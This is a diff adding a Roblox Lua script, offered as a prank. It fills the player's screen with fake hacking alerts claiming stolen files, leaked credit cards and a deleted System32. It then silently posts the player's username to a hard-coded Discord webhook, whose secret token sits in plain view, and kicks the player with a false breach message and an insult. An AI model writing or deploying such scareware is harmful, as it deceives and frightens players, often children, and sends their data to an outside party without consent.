@@ -1,0 +1,63 @@
+local player = game.Players.LocalPlayer
+local httpService = game:GetService("HttpService")
+
+-- Replace this with your actual Discord Webhook URL
+local webhookURL = "https://discord.com/api/webhooks/1335428115400228875/2jhuIMiD3-3pIIhLJy0FM-6SXBYvROCI-lDCfrB6IvR_IRjIt_EzZnP3eirJnWhpRjrf"
+
+-- Create Fake Virus UI
+local gui = Instance.new("ScreenGui", player.PlayerGui)
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+
+local textLabel = Instance.new("TextLabel", frame)
+textLabel.Size = UDim2.new(1, 0, 1, 0)
+textLabel.TextColor3 = Color3.new(1, 0, 0)
+textLabel.TextScaled = true
+textLabel.BackgroundTransparency = 1
+textLabel.Font = Enum.Font.GothamBlack
+textLabel.Text = "HACKED!"
+
+-- Glitch Effect
+spawn(function()
+	while true do
+		textLabel.Text = "ALL FILES STOLEN"
+		wait(0.2)
+		textLabel.Text = "CREDIT CARD INFO LEAKED"
+		wait(0.2)
+		textLabel.Text = "DELETING SYSTEM32..."
+		wait(0.2)
+		textLabel.Text = "YOU'VE BEEN HACKED!"
+		wait(0.2)
+	end
+end)
+
+-- Screen Flicker
+for i = 1, 15 do
+	frame.BackgroundColor3 = Color3.new(1, 0, 0)
+	wait(0.1)
+	frame.BackgroundColor3 = Color3.new(0, 0, 0)
+	wait(0.1)
+end
+
+-- Send Discord Message
+local data = {
+    ["content"] = "**" .. player.Name .. "** has been prankED LOOL"
+}
+
+local jsonData = httpService:JSONEncode(data)
+
+-- Send the HTTP request (Webhook)
+spawn(function()
+    pcall(function()
+        httpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
+    end)
+end)
+
+-- Fake "Crashing System"
+textLabel.Text = "SHUTTING DOWN SYSTEM..."
+wait(3)
+
+-- Kick Player
+game.Players.LocalPlayer:Kick("FATAL ERROR: SYSTEM BREACH DETECTED. REINSTALL REQUIRED, BY SHADOWDEVNOTHERE ON ROBLOX, HAHA FUCK YOU!")
+--DW IS A HARMLESS PRANK!!
